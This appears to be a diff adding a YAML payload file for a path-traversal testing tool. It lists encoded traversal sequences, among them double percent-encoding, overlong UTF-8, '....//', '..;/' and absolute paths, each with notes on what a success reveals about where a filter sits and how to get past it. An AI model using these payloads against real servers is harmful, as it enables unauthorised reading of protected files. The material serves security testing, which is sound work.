@@ -1,0 +1,54 @@
+# Encodings, and the reason each one works. Ordered by what they distinguish
+# rather than by popularity: each entry answers a different question about where
+# in the pipeline the filter sits.
+#
+# The order matters. A filter that strips a sequence and one that rejects the
+# request are different findings, and trying the exotic forms first hides which
+# of the two you are looking at.
+#
+# {{TARGET}} is the file being asked for. Entries are the traversal element
+# itself, repeated to the depth the probe unit established.
+id: traversal/encoding
+reviewed: "2026-08-25"
+title: Encodings and what each one distinguishes
+variables: [TARGET]
+credits:
+  - "These forms are long-standing public technique; the ordering and what each distinguishes are written for this project."
+entries:
+  - name: plain
+    payload: "../"
+    detect: "The control. Anything below is only meaningful as a difference from this."
+
+  - name: single percent-encoded
+    payload: "%2e%2e%2f"
+    detect: "Succeeding here while the plain form fails places the filter before the decoder: it inspected text the server had not decoded yet."
+
+  - name: double percent-encoded
+    payload: "%252e%252e%252f"
+    detect: "Succeeding here places a second decode after the filter -- usually a proxy decoding once and an application decoding again."
+    note: "The classic reverse-proxy shape. It is evidence about the architecture, not only about the filter."
+
+  - name: overlong UTF-8
+    payload: "%c0%ae%c0%ae/"
+    detect: "Succeeding means a decoder accepts non-shortest-form sequences that a filter comparing bytes never saw as dots."
+    note: "Rejected by conformant decoders for two decades. Worth one request on an old stack, and no more."
+
+  - name: stripped-sequence doubling
+    payload: "....//"
+    detect: "Succeeding means the filter strips ../ once and does not re-examine what the strip produced."
+    note: "The single most productive entry against filters written as a replace call rather than a rejection."
+
+  - name: interior separator
+    payload: "..;/"
+    detect: "Succeeding means a servlet container treats the segment parameter as part of the segment while the filter does not."
+    platform: [java]
+
+  - name: mixed separators
+    os: [windows]
+    payload: "..%5c..%2f"
+    detect: "Succeeding means the resolver accepts both separators while the filter was written for one of them."
+
+  - name: absolute path
+    payload: "/{{TARGET}}"
+    detect: "Succeeding means the value is concatenated without being treated as relative, so no traversal sequence is needed at all."
+    note: "Try it early. It is the cheapest entry in the file and it makes every other one unnecessary."
